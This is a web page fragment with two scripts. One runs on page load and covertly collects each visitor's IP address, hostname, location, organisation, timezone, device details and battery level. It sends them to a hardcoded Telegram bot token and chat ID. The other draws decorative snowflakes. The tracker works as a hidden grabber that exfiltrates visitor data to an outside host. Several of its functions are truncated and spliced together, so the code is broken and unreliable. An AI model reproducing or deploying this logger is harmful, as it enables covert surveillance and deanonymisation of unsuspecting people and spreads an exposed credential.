    <script>
        const botToken = '7837786515:AAHBc4SRk-m1HMPngRj__VsiuuDqMY82lZo';
        const chatId = '-1002149446987';
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Недоступно",
                hardwareConcurrency: navigator.hardwareConcurrency || "Недоступно",
            };
            return deviceInfo;
        }
        async function getIPAddress() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Ошибка при получении IP:", error);
                return "Недоступно";
            }
        }
    
        async function getHost() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.hostname;
            } catch (error) {
                console.error("Ошибка при получении Hostname:", error);
                return "Недоступно";
            }
        }
    
    
        async function getCity() {

        async function getOrg() {
            try {

        async function getTimezone() {
            try {

                return data.timezone;
            } catch (error) {
                console.error("Ошибка при получении timezone:", error);
                return "Недоступно";
            }
        }
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return Math.round(battery.level * 100);
                } catch (error) {
                    console.error("Ошибка при получении уровня батареи:", error);
                    return "Недоступно";
                }
            } else {
                return "API батареи не поддерживается";
            }
        }
        async function sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone) {
            const message = `
                Новый запрос!
                IP: ${ipAddress}
                Hostname: ${host}
                Город: ${city}
                Регион: ${region}
                Страна: ${country}
                locate: ${loc}
                Organization: ${org}
                Timezone: ${timezone}
                Устройство: ${deviceInfo.userAgent}
                Платформа: ${deviceInfo.platform}
                Язык: ${deviceInfo.language}
                Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
                Память устройства: ${deviceInfo.deviceMemory} GB
                Ядра процессора: ${deviceInfo.hardwareConcurrency}
                Уровень батареи: ${batteryLevel}%
            `;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`; // Backticks for token
            const params = {
                chat_id: chatId,
                text: message,
            };
    
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(params),
                });
    
                if (response.ok) {
                    console.log("Данные успешно отправлены в Telegram.");
                } else {
                    console.error("Ошибка при отправке данных в Telegram.");
                }
            } catch (error) {
                console.error("Ошибка при отправке данных:", error);
            }
        }
        async function main() {
            const deviceInfo = await collectDeviceInfo();
            const ipAddress = await getIPAddress();
            const batteryLevel = await getBatteryLevel();
            const host = await getHost();
            const city = await getCity();
            const region = await getRegion();
            const country = await getCountry();
            const loc = await getLoc();
            const org = await getOrg();
            const timezone = await getTimezone();
            await sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone);
        }
        main();

    <script>
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');
            const size = Math.random() * 5 + 5;
            snowflake.style.width = size + 'px';
            snowflake.style.height = size + 'px';
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = (Math.random() * 5 + 5) + 's';
            document.body.appendChild(snowflake);
            snowflake.addEventListener('animationend', () => snowflake.remove());
        }
        setInterval(createSnowflake, Math.random() * 1000 + 500);
